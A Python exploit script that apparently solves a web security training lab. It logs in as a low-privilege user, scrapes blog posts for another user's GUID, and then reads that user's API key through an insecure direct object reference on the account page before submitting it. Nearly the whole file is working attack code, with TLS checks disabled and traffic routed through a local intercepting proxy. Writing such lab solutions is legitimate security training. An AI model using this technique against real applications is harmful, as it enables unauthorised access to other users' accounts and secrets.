#!/usr/bin/env python3
import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if token:
        return token["value"]
    return None

def login(s, url, username, password):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    data = {"username": username, "password": password}
    if csrf:
        data["csrf"] = csrf
    r = s.post(login_page, data=data, verify=False, allow_redirects=False, proxies=proxies, timeout=10)
    if r.status_code == 302:
        return True
    return False

def find_carlos_guid(s, url):
    print("[*] Searching blog posts for Carlos' GUID...")
    for i in range(1, 20):
        post_url = url + f"/post?postId={i}"
        r = s.get(post_url, verify=False, proxies=proxies)
        soup = BeautifulSoup(r.text, "html.parser")
        try:
            r = soup.find("span", attrs={"id": "blog-author"})
            r = r.find("a", string="carlos")
            if r is not None:
                return r.get("href").split("=")[1]
        except:
            continue
    return None

def get_carlos_api_key(s, url, guid):
    carlos_url = url + "/my-account?id=" + guid
    r = s.get(carlos_url, verify=False, proxies=proxies)
    if "carlos" in r.text:
        print("[*] Retrieving Carlos' API key...")
    soup = BeautifulSoup(r.text, "html.parser")
    apikey = soup.find(string=re.compile("Your API Key is")).split(": ")[1]
    print(f"[+] Carlos' API key is: {apikey}")
    apikey = apikey.strip()
    if "API Key" in r.text:
        return apikey
    return False 

def submit_answer(s, url, guid):
    key = get_carlos_api_key(s, url, guid)
    print("[*] Submitting answer...")
    submit_url = url + "/submitSolution"
    data = {"answer": key}
    r = s.post(submit_url, data=data, verify=False, allow_redirects=True)
    if "true" in r.text:
        return True
    return False         

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login(s, url, "wiener", "peter"):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    guid = find_carlos_guid(s, url)
    if guid:
        print("[+] Carlos GUID found:", guid)
    else:
        print("[-] Carlos GUID not found")

    if  not submit_answer(s, url, guid):
        print("[+] Error submitting answer")
        return
    print("[+] Lab solved")     

if __name__ == "__main__":
    main()